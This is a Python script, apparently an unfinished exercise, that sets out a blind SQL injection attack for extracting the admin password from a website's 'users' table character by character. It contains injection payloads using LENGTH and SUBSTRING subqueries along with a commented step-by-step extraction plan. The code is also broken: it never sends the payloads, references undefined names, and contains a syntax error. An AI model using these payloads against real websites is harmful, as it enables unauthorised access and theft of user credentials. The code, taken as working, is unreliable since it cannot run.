import requests

# post a request and return the status code
def post_request(URL, PARAMS):
    try:
        # sending post request and saving the response as response object
        r = requests.post(url = URL, data = PARAMS)
        #you can add here to return the response in json file from the website
        return r.status_code
    except:
        return "ERROR"

def main():
    # define api-endpoint
    URL = ""
    #status = post_request(URL, PARAMS)

    pass_found = ""

    #say a vulrenable website with no senitizations and provide a json repsonse like "Invalid Password" or "Username not found"

    ''' # Steps to get the password we want
    #Main idea: using SQL statements we will force the website to show UserNotFound until we got InvalidPassword
    in this case we know that the char match and we will add it to the array
    #NOTE: we will depend on "!" to check the existence of the char, and "z" as max for simplicity 
    1- check the length of the password
    2- start with first char of the password and end loop when reaching password length extracted from (1)
    3- we are interested in knowing is the char a number (0-9)?, capital letter(A-Z)? or small letter?(a-z)
    for simplicity we will ignore symbols
    4- If it matches one of the three options, we will loop from first-to-last possible char from that range
    5- if we got response InvalidPassword, then we got the char that match, so we add it to array and 
    move to next iteration
    '''
    char_is_number = False
    char_is_capital = False
    char_is_small = False

    sql_inject_statement = "' OR LENGTH ((SELECT password FROM users WHERE username = 'admin')) > 0"
    password_len = 0
    password_extract = []
    for i in range(25):
        sql_inject_statement = f"' OR LENGTH ((SELECT password FROM users WHERE username = 'admin')) > {i}"
        # send here the request if no user found continue, if invalid passowrd: save password len in varibale

    for i in range(password_len):
        # call function check_option
        if (check_option == "number"):
            for j in range(10):
                sql_inject_statement = f"' OR SUBSTRING ((SELECT password FROM users WHERE username = 'admin'), {i}, 1) = {j}"
                if (match):
                    password_extract.append(j)
        if(capital lettes):


    #to extract password of username from table "users"

if __name__ == "__main__":
    main()
